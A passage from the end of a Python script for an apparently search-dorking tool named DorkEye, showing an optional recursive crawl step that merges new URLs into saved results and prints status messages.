            console.print(f"[yellow][Agents] Error: {_ae}[/yellow]")

    # ── Adaptive recursive crawl (--crawl) ───────────────────────────────────────
    if getattr(args, "crawl", False):
        if not _ANALYZE_AVAILABLE:
            console.print("[yellow][!] dorkeye_agents.py not found — crawl not available.[/yellow]")
        else:
            console.print("\n[bold cyan][Crawl] Starting adaptive recursive crawl...[/bold cyan]")
            try:
                crawl_out = run_crawl(
                    seed_dorks = dorks,
                    args       = args,
                    target     = "",
                )
                if crawl_out.get("results"):
                    # Merge crawl results with the initial search results
                    existing_urls = {r.get("url") for r in dorkeye.results}
                    new_from_crawl = [
                        r for r in crawl_out["results"]
                        if r.get("url") not in existing_urls
                    ]
                    dorkeye.results.extend(new_from_crawl)
                    if dorkeye.output_file:
                        dorkeye.save_results()
                    console.print(
                        f"\n[bold green][Crawl] Completed — "
                        f"{crawl_out['rounds']} round(s) | "
                        f"+{len(new_from_crawl)} new result(s) | "
                        f"stop: {crawl_out['stop_reason']}[/bold green]"
                    )
                    if crawl_out.get("report_path"):
                        console.print(
                            f"[bold green][✓] Crawl report → {crawl_out['report_path']}[/bold green]"
                        )
            except Exception as _ce:
                console.print(f"[yellow][Crawl] Error: {_ce}[/yellow]")

    if dorkeye.output_file:
        console.print(f"\n[bold green][✓] Results saved → Dump/{output_file}[/bold green]")
    else:
        console.print(f"\n[dim][~] No output file specified — results not saved to disk.[/dim]")


if __name__ == "__main__":
    main()
